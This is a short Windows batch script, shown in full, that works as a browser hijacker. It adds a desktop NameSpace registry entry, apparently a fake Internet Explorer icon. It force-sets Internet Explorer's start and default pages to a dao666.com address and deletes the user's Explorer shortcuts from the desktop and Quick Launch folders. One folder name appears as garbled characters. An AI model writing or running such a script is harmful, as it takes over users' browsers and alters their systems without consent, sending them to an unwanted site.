REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Desktop\NameSpace\{00000306-0000-0021-8500-00AA006DABDD}"


REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v  "Start Page"  /t REG_SZ /d "http://www.dao666.com/?cmd2" /f
REG ADD "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main" /v "Default_Page_URL" /t REG_SZ /d "http://www.dao666.com/?cmd2" /f

del "%USERPROFILE%\����\*Explorer*.*"
del "%USERPROFILE%\Application Data\Microsoft\Internet Explorer\Quick Launch\*Explorer*.*"